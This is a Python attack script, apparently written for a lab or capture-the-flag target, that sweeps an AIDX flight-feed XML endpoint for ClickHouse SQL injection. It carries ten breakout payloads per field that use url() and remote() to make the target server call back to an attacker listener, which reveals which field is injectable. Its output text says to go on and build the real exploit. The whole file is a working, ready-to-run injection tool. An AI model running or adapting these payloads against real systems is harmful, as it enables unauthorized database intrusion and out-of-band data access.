#!/usr/bin/env python3
"""
ClickHouse-injection sweep for the AIDX feed.

Idea: the /feeds/aidx consumer inserts your XML fields into ClickHouse.
We don't know the exact INSERT shape, so we spray many breakout variants,
each placed in one field at a time, and each carrying a UNIQUE callback URL.

When one variant fires, your listener log shows a GET like:
    GET /hit/<FIELD>/<VARIANT_ID>
...which tells you EXACTLY which field is injectable and which breakout
syntax worked. No guessing afterwards.

Usage:
    1) In another terminal, in an empty dir:  sudo python3 -m http.server 80
    2) python3 ch_inject_sweep.py --lhost 10.10.16.249 --target 10.129.247.123

Watch the http.server console. Any GET /hit/... = injection confirmed.
No callback after the sweep + wait = the field isn't concatenated into a
query that reaches url()/remote() (i.e. this vector is likely closed).
"""

import argparse
import time
import sys
import urllib.request

# The five text-ish fields in the AIDX body that plausibly reach an INSERT.
# key = logical field name (used in the callback path so you can see which hit)
FIELDS = ["CompanyShortName", "Airline", "FlightNumber", "DepartureAirport", "ArrivalAirport"]

# Base valid template. {FIELD_PLACEHOLDERS} get swapped per-run.
# Only ONE field carries the payload at a time; the rest stay valid.
TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<IATA_AIDX_FlightLegNotifRQ>
  <Originator CompanyShortName="{CompanyShortName}" />
  <FlightLeg>
    <LegIdentifier>
      <Airline CodeContext="3">{Airline}</Airline>
      <FlightNumber>{FlightNumber}</FlightNumber>
      <DepartureAirport CodeContext="3">{DepartureAirport}</DepartureAirport>
      <ArrivalAirport CodeContext="3">{ArrivalAirport}</ArrivalAirport>
      <OriginDate>2026-10-14</OriginDate>
    </LegIdentifier>
  </FlightLeg>
</IATA_AIDX_FlightLegNotifRQ>
"""

# Sane defaults for the non-payload fields so the message stays valid.
DEFAULTS = {
    "CompanyShortName": "TEST",
    "Airline": "LH",
    "FlightNumber": "1234",
    "DepartureAirport": "FRA",
    "ArrivalAirport": "MUC",
}

def build_variants(lhost):
    """
    Each variant is a (variant_id, payload_factory) where payload_factory(cb_url)
    returns the string to drop into a single field. cb_url is the unique callback.

    We cover the common ClickHouse breakout shapes for a value spliced into:
        INSERT INTO t (...) VALUES ('<HERE>', ...)
        INSERT INTO t ... SELECT ... FROM values(... '<HERE>' ...)
        a WHERE / query context
    plus remote()/url() and a couple of comment styles.
    """
    def url_call(cb):
        # url() table function - server fetches cb => callback on your listener
        return f"url('{cb}','CSV','x String')"

    variants = []

    # 1) single-quote VALUES breakout, subquery select from url()
    variants.append(("q1_values_subselect",
        lambda cb: f"x'),((select c from {url_call(cb)} limit 1))) -- "))
    # 2) single-quote, close paren, new SELECT statement
    variants.append(("q2_stmt_select",
        lambda cb: f"x'); select * from {url_call(cb)}; -- "))
    # 3) double paren close (INSERT ... VALUES (( ... )) style)
    variants.append(("q3_double_paren",
        lambda cb: f"x')); select * from {url_call(cb)}; -- "))
    # 4) plain single-quote escape into a function call, no stmt terminator
    variants.append(("q4_inline_func",
        lambda cb: f"x' || (select c from {url_call(cb)} limit 1) || '"))
    # 5) backtick/identifier context attempt
    variants.append(("q5_ident",
        lambda cb: f"x`,(select c from {url_call(cb)} limit 1),`"))
    # 6) no-quote (numeric field like FlightNumber may be unquoted)
    variants.append(("q6_numeric_bare",
        lambda cb: f"1234,(select c from {url_call(cb)} limit 1)"))
    # 7) numeric field, statement terminator
    variants.append(("q7_numeric_stmt",
        lambda cb: f"1234); select * from {url_call(cb)}; -- "))
    # 8) format-string / Jinja-ish, in case consumer templates before CH
    variants.append(("q8_template",
        lambda cb: f"{{{{ {url_call(cb)} }}}}"))
    # 9) remote() instead of url() in case url() is disabled
    variants.append(("q9_remote",
        lambda cb: f"x'); select * from remote('{lhost}:9000','system','one'); -- "))
    # 10) bare url() as whole value, in case value is used in a FROM
    variants.append(("q10_bare_url",
        lambda cb: url_call(cb)))

    return variants

def send(target_url, xml):
    req = urllib.request.Request(
        target_url,
        data=xml.encode(),
        headers={"Content-Type": "application/xml"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, r.read(80)
    except Exception as e:
        return None, str(e).encode()

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--lhost", required=True, help="your tun0 IP (listener)")
    ap.add_argument("--target", required=True, help="target IP")
    ap.add_argument("--port", default="8081")
    ap.add_argument("--lport", default="80", help="listener port for callbacks")
    ap.add_argument("--delay", type=float, default=1.0, help="seconds between sends")
    args = ap.parse_args()

    target_url = f"http://{args.target}:{args.port}/feeds/aidx"
    variants = build_variants(args.lhost)

    total = len(FIELDS) * len(variants)
    print(f"[*] Target : {target_url}")
    print(f"[*] Listener: http://{args.lhost}:{args.lport}/  (watch its log)")
    print(f"[*] Sending {total} payloads ({len(FIELDS)} fields x {len(variants)} variants)")
    print(f"[*] A callback path tells you field+variant. Ctrl-C to stop.\n")

    n = 0
    for field in FIELDS:
        for vid, factory in variants:
            n += 1
            cb = f"http://{args.lhost}:{args.lport}/hit/{field}/{vid}"
            fields = dict(DEFAULTS)
            fields[field] = factory(cb)
            xml = TEMPLATE.format(**fields)
            status, body = send(target_url, xml)
            tag = f"{field}/{vid}"
            print(f"[{n:>3}/{total}] {tag:<40} -> {status} {body[:40]!r}")
            time.sleep(args.delay)

    print("\n[*] Sweep done. KEEP the listener running — async consumer")
    print("[*] callbacks can arrive late. Wait 2-3 min before concluding.")
    print("[*] Any 'GET /hit/<field>/<variant>' on the listener = that field")
    print("[*] is injectable with that breakout. Build the real exploit from it.")

if __name__ == "__main__":
    main()
